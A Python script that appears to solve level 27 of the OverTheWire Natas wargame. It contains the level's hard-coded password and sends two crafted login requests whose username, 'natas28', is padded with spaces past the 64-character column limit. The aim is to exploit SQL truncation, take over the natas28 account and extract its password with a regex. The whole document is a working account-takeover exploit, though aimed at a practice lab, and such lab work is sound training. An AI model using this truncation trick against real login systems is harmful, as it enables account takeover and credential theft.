import requests
import re

username = 'natas27'
password = 'PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3'

url = 'http://%s.natas.labs.overthewire.org/' % username

with open('natas27.html', 'w+') as out:
    session = requests.Session()
    # res = session.get(url, auth=(username, password))
    # content = res.text

    res = session.post(
        url, data={"username": "natas28"+" " * (64 - len('natas28'))+"x", "password": "anything"}, auth=(username, password))
    content = res.text
    out.write(content)
    out.write("="*50+"\n")

    res = session.post(
        url, data={"username": "natas28"+" " * (64 - len('natas28')), "password": "anything"}, auth=(username, password))
    content = res.text
    flag = re.findall('\[password\] \=\&gt\; (.*)\n\)',content)[0]
    out.write(content)
    print(flag)
